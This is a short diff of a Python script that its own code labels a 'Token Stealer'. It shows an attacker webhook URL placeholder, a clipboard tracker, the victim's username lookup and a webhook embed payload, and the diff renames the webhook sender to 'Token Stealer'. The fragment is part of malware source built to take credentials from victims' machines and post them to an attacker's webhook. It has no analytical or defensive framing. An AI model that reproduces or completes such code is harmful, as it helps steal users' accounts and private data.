@@ -26,17 +26,17 @@ from Crypto.Random import get_random_bytes
 import ctypes, sys 
 last_clipboard = ""
 WEBHOOK_URL = "" # Replace with your webhook
-WEBHOOK_USERNAME = "bob" # U can change 
-WEBHOOK_AVATAR = "" # U can change 
+WEBHOOK_USERNAME = "Token Stealer" 
+WEBHOOK_AVATAR = ""  
 username = getpass.getuser()
 payload = {
     "username": WEBHOOK_USERNAME,
     "embeds": [
         {
-            "title": "", # U can change 
-            "description": f"", # U can change 
-            "color": 16711680, # U can change 
-            "image": { # U can change 
+            "title": "", 
+            "description": f"",
+            "color": 16711680, 
+            "image": { 
             }
         }
     ]
